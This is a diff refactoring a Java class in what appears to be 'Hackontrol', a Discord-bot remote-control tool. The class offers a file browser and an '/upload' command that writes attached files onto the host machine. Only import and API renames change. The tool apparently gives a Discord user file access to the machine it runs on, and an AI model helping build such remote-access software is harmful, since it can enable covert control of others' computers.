@@ -5,15 +5,16 @@ import java.io.FileOutputStream;
 import java.io.InputStream;
 
 import com.khopan.hackontrol.HackontrolChannel;
-import com.khopan.hackontrol.manager.button.ButtonManager;
 import com.khopan.hackontrol.manager.command.CommandContext;
 import com.khopan.hackontrol.manager.command.CommandManager;
-import com.khopan.hackontrol.manager.common.sender.sendable.MessageCreateDataSendableListener;
-import com.khopan.hackontrol.manager.modal.ModalManager;
+import com.khopan.hackontrol.manager.interaction.ButtonManager;
+import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
+import com.khopan.hackontrol.manager.interaction.InteractionManager;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
 import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
+import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;
 
 import net.dv8tion.jda.api.entities.Message.Attachment;
 import net.dv8tion.jda.api.interactions.commands.OptionMapping;
@@ -21,14 +22,13 @@ import net.dv8tion.jda.api.interactions.commands.OptionType;
 import net.dv8tion.jda.api.interactions.commands.build.Commands;
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
-import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 
 public class FileChannel extends HackontrolChannel {
 	private static final String CHANNEL_NAME = "file";
 
-	private static final Button BUTTON_QUERY_FILE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Query File", "queryFile");
+	private static final Button BUTTON_QUERY_FILE = ButtonManager.staticButton(ButtonType.SUCCESS, "Query File", "queryFile");
 
-	private FileBrowser browser;
+	private FileBrowser<?> browser;
 
 	@Override
 	public String getName() {
@@ -37,10 +37,10 @@ public class FileChannel extends HackontrolChannel {
 
 	@Override
 	public void preInitialize(Registry registry) {
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, FileChannel.BUTTON_QUERY_FILE, context -> this.browser = FileBrowser.start(context));
-		registry.register(ModalManager.MODAL_REGISTRY, FileBrowser.MODAL_VIEW, context -> this.browser.modalView(context));
-		registry.register(ModalManager.MODAL_REGISTRY, FileBrowser.MODAL_GO_INTO, context -> this.browser.modalGoInto(context));
-		registry.register(CommandManager.COMMAND_REGISTRY, Commands.slash("upload", "Upload a file").addOption(OptionType.ATTACHMENT, "file", "File to upload", true), this :: commandUploadFile);
+		registry.register(InteractionManager.BUTTON_REGISTRY, FileChannel.BUTTON_QUERY_FILE, context -> this.browser = FileBrowser.start(context));
+		registry.register(InteractionManager.MODAL_REGISTRY,  FileBrowser.MODAL_VIEW,        context -> this.browser.modalView(context));
+		registry.register(InteractionManager.MODAL_REGISTRY,  FileBrowser.MODAL_GO_INTO,     context -> this.browser.modalGoInto(context));
+		registry.register(CommandManager.COMMAND_REGISTRY,    Commands.slash("upload", "Upload a file").addOption(OptionType.ATTACHMENT, "file", "File to upload", true), this :: commandUploadFile);
 	}
 
 	@Override
@@ -85,9 +85,9 @@ public class FileChannel extends HackontrolChannel {
 				FileOutputStream outputStream = new FileOutputStream(file);
 				outputStream.write(data);
 				outputStream.close();
-				HackontrolMessage.deletable(MessageCreateDataSendableListener.of(consumer), "`Upload to '" + file.getAbsolutePath() + "'`");
+				HackontrolMessage.deletable(ConsumerMessageCreateDataSendable.of(consumer), "`Upload to '" + file.getAbsolutePath() + "'`");
 			} catch(Throwable Errors) {
-				HackontrolError.throwable(MessageCreateDataSendableListener.of(consumer), Errors);
+				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
 			}
 		});
 	}
